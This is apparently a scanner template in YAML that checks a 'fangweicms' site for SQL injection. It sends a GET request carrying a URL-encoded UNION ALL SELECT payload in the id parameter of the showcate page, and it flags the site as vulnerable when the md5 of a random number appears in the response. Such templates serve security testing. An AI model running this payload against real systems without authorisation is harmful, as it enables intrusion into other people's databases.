id: fangweicms-sqli

info:
    name: fangweicms-sqli
    author: Rexus
    severity: high

manual: true
transport: http
set:
    rand: randomInt(200000000, 210000000)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /index.php?m=Goods&a=showcate&id=103%20UNION%20ALL%20SELECT%20CONCAT%28md5({{rand}})%29%23
        expression: response.body.bcontains(bytes(md5(string(rand))))
expression: r0()

